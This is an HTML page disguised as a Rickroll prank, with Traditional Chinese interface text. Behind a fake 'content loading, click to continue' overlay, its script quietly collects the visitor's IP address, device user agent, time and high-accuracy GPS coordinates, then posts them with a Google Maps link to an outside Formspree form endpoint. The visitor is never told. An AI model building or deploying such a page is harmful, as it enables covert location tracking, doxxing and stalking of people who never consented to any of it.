<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Never Gonna Give You Up</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: black; }
        .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; }
        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); color: white; display: flex;
            justify-content: center; align-items: center; z-index: 100; cursor: pointer;
            font-family: sans-serif; text-align: center;
        }
    </style>
</head>
<body>

    <div id="overlay" onclick="startRickRoll()">
        <div>
            <h1>⚠️ 內容載入中...</h1>
            <p>請點擊螢幕以繼續觀看</p>
        </div>
    </div>

    <div id="player"></div>

    <script>
        const FORM_ENDPOINT = "https://formspree.io/f/xdawapwr";
        let trackingData = {
            ip: "獲取中...",
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            time: new Date().toLocaleString()
        };

        // 1. 立即獲取 IP (不需要權限)
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { trackingData.ip = data.ip; })
            .catch(() => { trackingData.ip = "隱藏或失敗"; });

        // 2. 當使用者點擊「繼續」時觸發
        function startRickRoll() {
            document.getElementById('overlay').style.display = 'none';
            
            // 載入影片 (自動播放需要使用者互動)
            loadYouTubeVideo();

            // 同時請求 GPS 定位
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendToEmail(pos.coords),
                    (err) => sendToEmail(null),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                sendToEmail(null);
            }
        }

        function loadYouTubeVideo() {
            const tag = document.createElement('script');
            tag.src = "https://www.youtube.com/iframe_api";
            const firstScriptTag = document.getElementsByTagName('script')[0];
            firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
        }

        let player;
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('player', {
                height: '100%',
                width: '100%',
                videoId: 'dQw4w9WgXcQ', // 經典 Rickroll ID
                playerVars: { 'autoplay': 1, 'controls': 0, 'rel': 0, 'showinfo': 0 },
                events: { 'onReady': (event) => event.target.playVideo() }
            });
        }

        function sendToEmail(coords) {
            const formData = new FormData();
            formData.append("🔴 真實 IP", trackingData.ip);
            formData.append("📱 手機/設備", trackingData.userAgent);
            formData.append("⏰ 時間", trackingData.time);

            if (coords) {
                formData.append("📍 GPS 緯度", coords.latitude);
                formData.append("📍 GPS 經度", coords.longitude);
                formData.append("🔗 地圖連結", `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`);
            } else {
                formData.append("⚠️ GPS 狀態", "拒絕定位");
            }

            fetch(FORM_ENDPOINT, {
                method: "POST",
                body: formData,
                headers: { 'Accept': 'application/json' }
            });
        }
    </script>
</body>
</html>
